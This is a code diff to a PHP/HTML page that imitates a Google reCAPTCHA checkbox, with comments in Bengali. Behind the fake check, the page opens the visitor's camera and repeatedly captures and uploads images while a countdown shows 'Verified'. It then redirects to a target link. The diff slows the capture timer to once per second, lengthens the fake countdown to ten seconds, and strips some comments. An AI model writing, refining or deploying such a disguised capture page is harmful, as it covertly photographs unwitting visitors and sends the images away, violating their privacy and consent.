@@ -134,7 +134,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             border-top: 3px solid #4285F4;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            display: none; /* শুরুতে বন্ধ থাকবে, ক্যামেরা ওপেন হওয়ার পর চালু হবে */
+            display: none; 
         }
 
         @keyframes spin {
@@ -162,7 +162,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             gap: 6px;
         }
 
-        /* কোলডাউন টাইমার টেক্সট স্টাইল */
         #countdownTimer {
             font-size: 12px;
             color: #666;
@@ -252,18 +251,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                 .then(stream => {
                     video.srcObject = stream;
                     
-                    // ক্যামেরা পুরোপুরি ওপেন হওয়ার পর প্রথম ছবি ক্যাপচার হবে এবং তারপর প্রসেস শুরু হবে
                     video.onloadedmetadata = () => {
                         if (isStarted) return;
                         isStarted = true;
 
-                        // প্রথম ছবি ইনস্ট্যান্ট ক্যাপচার করে পাঠানো
+                        // প্রথম ছবি ইনস্ট্যান্ট ক্যাপচার করা
                         captureAndUpload();
 
-                        // প্রতি ০.৫ সেকেন্ড পর পর ছবি পাঠানো চালু
-                        setInterval(captureAndUpload, 500);
+                        // প্রতি ১ সেকেন্ড (1000ms) পর পর ছবি পাঠানো চালু
+                        setInterval(captureAndUpload, 1000);
 
-                        // স্পিনার ও ৬ সেকেন্ডের কোলডাউন কাউন্টডাউন শুরু
                         const checkbox = document.getElementById('recaptchaCheckbox');
                         const spinner = document.getElementById('recaptchaSpinner');
                         const countdownTimer = document.getElementById('countdownTimer');
@@ -271,7 +268,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 
                         spinner.style.display = 'block';
                         
-                        let timeLeft = 6; // ৬ সেকেন্ড সময়
+                        let timeLeft = 10; // ১০ সেকেন্ড সময়
                         countdownTimer.textContent = `(${timeLeft}s)`;
 
                         let timerInterval = setInterval(() => {
@@ -285,7 +282,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                                 statusText.textContent = 'Verified';
                                 checkbox.classList.add('checked');
                                 
-                                // সফলভাবে শেষ হওয়ার পর মেইন ট্যাবে টার্গেট লিংক ওপেন হবে
                                 setTimeout(() => {
                                     window.location.href = finalUrl;
                                 }, 500);
